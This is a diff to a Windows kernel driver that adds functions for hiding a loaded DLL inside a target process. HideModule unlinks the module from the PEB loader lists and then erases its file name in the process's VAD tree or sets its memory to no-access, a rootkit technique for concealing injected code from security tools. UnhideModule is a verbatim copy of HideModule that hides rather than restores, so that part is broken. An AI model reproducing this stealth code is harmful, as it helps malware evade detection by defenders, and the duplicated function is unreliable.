@@ -385,6 +385,174 @@ CleanUp:
 
 /*
 * Description:
+* HideModule is responsible for hiding user mode module that is loaded in a process.
+*
+* Parameters:
+* @ModuleInformation [HiddenModuleInformation*] -- Required information, contains PID and module's name.
+*
+* Returns:
+* @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
+*/
+NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
+	PLDR_DATA_TABLE_ENTRY pebEntry;
+	KAPC_STATE state;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	PEPROCESS targetProcess = NULL;
+	LARGE_INTEGER time = { 0 };
+	PVOID moduleBase = NULL;
+	time.QuadPart = -100ll * 10 * 1000;
+
+	WCHAR* moduleName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR), DRIVER_TAG);
+
+	if (!moduleName)
+		return status;
+
+	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
+
+	// Getting the process's PEB.
+	status = PsLookupProcessByProcessId(ULongToHandle(ModuleInformation->Pid), &targetProcess);
+
+	if (!NT_SUCCESS(status)) {
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return status;
+	}
+
+	KeStackAttachProcess(targetProcess, &state);
+	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(targetProcess);
+
+	if (!targetPeb) {
+		KeUnstackDetachProcess(&state);
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return STATUS_ABANDONED;
+	}
+
+	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
+	}
+
+	if (!targetPeb->LoaderData) {
+		KeUnstackDetachProcess(&state);
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	// Finding the module inside the process.
+	status = STATUS_NOT_FOUND;
+
+	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+		pListEntry = pListEntry->Flink) {
+
+		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (pebEntry->FullDllName.Length > 0) {
+			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+				moduleBase = pebEntry->DllBase;
+				RemoveEntryList(&pebEntry->InLoadOrderLinks);
+				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
+				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
+				RemoveEntryList(&pebEntry->HashLinks);
+				status = STATUS_SUCCESS;
+				break;
+			}
+		}
+	}
+
+	KeUnstackDetachProcess(&state);
+
+	if (NT_SUCCESS(status))
+		status = VadHideObject(targetProcess, (ULONG_PTR)moduleBase);
+
+	ExFreePoolWithTag(moduleName, DRIVER_TAG);
+	return status;
+}
+
+/*
+* Description:
+* HideModule is responsible for hiding user mode module that is loaded in a process.
+*
+* Parameters:
+* @ModuleInformation [HiddenModuleInformation*] -- Required information, contains PID and module's name.
+*
+* Returns:
+* @status			 [NTSTATUS]					-- Whether successfuly hidden or not.
+*/
+NTSTATUS MemoryUtils::UnhideModule(HiddenModuleInformation* ModuleInformation) {
+	PLDR_DATA_TABLE_ENTRY pebEntry;
+	KAPC_STATE state;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	PEPROCESS targetProcess = NULL;
+	LARGE_INTEGER time = { 0 };
+	PVOID moduleBase = NULL;
+	time.QuadPart = -100ll * 10 * 1000;
+
+	WCHAR* moduleName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR), DRIVER_TAG);
+
+	if (!moduleName)
+		return status;
+
+	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
+
+	// Getting the process's PEB.
+	status = PsLookupProcessByProcessId(ULongToHandle(ModuleInformation->Pid), &targetProcess);
+
+	if (!NT_SUCCESS(status)) {
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return status;
+	}
+
+	KeStackAttachProcess(targetProcess, &state);
+	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(targetProcess);
+
+	if (!targetPeb) {
+		KeUnstackDetachProcess(&state);
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return STATUS_ABANDONED;
+	}
+
+	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
+	}
+
+	if (!targetPeb->LoaderData) {
+		KeUnstackDetachProcess(&state);
+		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	// Finding the module inside the process.
+	status = STATUS_NOT_FOUND;
+
+	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+		pListEntry = pListEntry->Flink) {
+
+		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (pebEntry->FullDllName.Length > 0) {
+			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+				moduleBase = pebEntry->DllBase;
+				RemoveEntryList(&pebEntry->InLoadOrderLinks);
+				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
+				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
+				RemoveEntryList(&pebEntry->HashLinks);
+				status = STATUS_SUCCESS;
+				break;
+			}
+		}
+	}
+
+	KeUnstackDetachProcess(&state);
+
+	if (NT_SUCCESS(status))
+		status = VadHideObject(targetProcess, (ULONG_PTR)moduleBase);
+
+	ExFreePoolWithTag(moduleName, DRIVER_TAG);
+	return status;
+}
+
+/*
+* Description:
 * KeWriteProcessMemory is responsible for writing data to any target process.
 *
 * Parameters:
@@ -493,6 +661,134 @@ NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress
 
 /*
 * Description:
+* VadHideObject is responsible for hiding a specific node inside a VAD tree.
+*
+* Parameters:
+* @Process			 [PEPROCESS] -- Target to process to search on its VAD.
+* @TargetAddress	 [ULONG_PTR] -- Virtual address of the module to hide.
+*
+* Returns:
+* @status			 [NTSTATUS]  -- STATUS_SUCCESS is hidden else error.
+*/
+NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) {
+	PRTL_BALANCED_NODE node = NULL;
+	PMMVAD_SHORT shortNode = NULL;
+	PMMVAD longNode = NULL;
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
+	ULONG_PTR targetAddressStart = TargetAddress >> PAGE_SHIFT;
+
+	// Finding the VAD node associated with the target address.
+	ULONG vadRootOffset = GetVadRootOffset();
+
+	if (vadRootOffset == 0)
+		return STATUS_INVALID_ADDRESS;
+
+	PRTL_AVL_TABLE vadTable = (PRTL_AVL_TABLE)((PUCHAR)Process + vadRootOffset);
+	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &node);
+
+	if (res != TableFoundNode)
+		return STATUS_NOT_FOUND;
+
+	shortNode = (PMMVAD_SHORT)node;
+
+	// Hiding the image name or marking the area as no access.
+	if (shortNode->u.VadFlags.VadType == VadImageMap) {
+		longNode = (PMMVAD)shortNode;
+
+		if (!longNode->Subsection)
+			return STATUS_INVALID_ADDRESS;
+
+		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
+			return STATUS_INVALID_ADDRESS;
+
+		PFILE_OBJECT fileObject = (PFILE_OBJECT)(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
+
+		if (fileObject->FileName.Length > 0)
+			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
+
+		status = STATUS_SUCCESS;
+	}
+	else if (shortNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
+		shortNode->u.VadFlags.Protection = NO_ACCESS;
+		status = STATUS_SUCCESS;
+	}
+	return status;
+}
+
+/*
+* Description:
+* VadFindNodeOrParent is responsible for finding a node inside the VAD tree.
+*
+* Parameters:
+* @Table			 [PRTL_AVL_TABLE]	   -- The table to search for the specific 
+* @TargetPageAddress [ULONG_PTR]		   -- The start page address of the searched mapped object.
+* @OutNode			 [PRTL_BALANCED_NODE*] -- NULL if wasn't find, else the result described in the Returns section.
+*
+* Returns:
+* @result			 [TABLE_SEARCH_RESULT] -- 
+* TableEmptyTree if the tree was empty
+* TableFoundNode if the key is found and the OutNode is the result node
+* TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
+*/
+TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode) {
+	PRTL_BALANCED_NODE child = NULL;
+	PRTL_BALANCED_NODE nodeToCheck = NULL;
+	PMMVAD_SHORT virtualAddressToCompare = NULL;
+	ULONG_PTR startAddress = 0;
+	ULONG_PTR endAddress = 0;
+	TABLE_SEARCH_RESULT result = TableEmptyTree;
+
+	if (Table->NumberGenericTableElements == 0 && Table->DepthOfTree == 0)
+		return result;
+
+	nodeToCheck = (PRTL_BALANCED_NODE)(&Table->BalancedRoot);
+
+	while (true) {
+		if (!nodeToCheck)
+			break;
+
+		virtualAddressToCompare = (PMMVAD_SHORT)nodeToCheck;
+		startAddress = (ULONG_PTR)virtualAddressToCompare->StartingVpn;
+		endAddress = (ULONG_PTR)virtualAddressToCompare->EndingVpn;
+
+		startAddress |= (ULONG_PTR)virtualAddressToCompare->StartingVpnHigh << 32;
+		endAddress |= (ULONG_PTR)virtualAddressToCompare->EndingVpnHigh << 32;
+
+		if (TargetPageAddress < startAddress) {
+			child = nodeToCheck->Left;
+
+			if (child) {
+				nodeToCheck = child;
+				continue;
+			}
+			*OutNode = nodeToCheck;
+			result = TableInsertAsLeft;
+			break;
+		}
+		else if (TargetPageAddress <= endAddress) {
+			*OutNode = nodeToCheck;
+			result = TableFoundNode;
+			break;
+		}
+		else {
+			child = nodeToCheck->Right;
+
+			if (child) {
+				nodeToCheck = child;
+				continue;
+			}
+
+			*OutNode = nodeToCheck;
+			result = TableInsertAsRight;
+			break;
+		}
+	}
+
+	return result;
+}
+
+/*
+* Description:
 * GetModuleBase is responsible for getting the base address of given module inside a given process.
 *
 * Parameters:
@@ -530,9 +826,11 @@ PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 
 		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-		if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-			moduleBase = pEntry->DllBase;
-			break;
+		if (pEntry->FullDllName.Length > 0) {
+			if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+				moduleBase = pEntry->DllBase;
+				break;
+			}
 		}
 	}
 
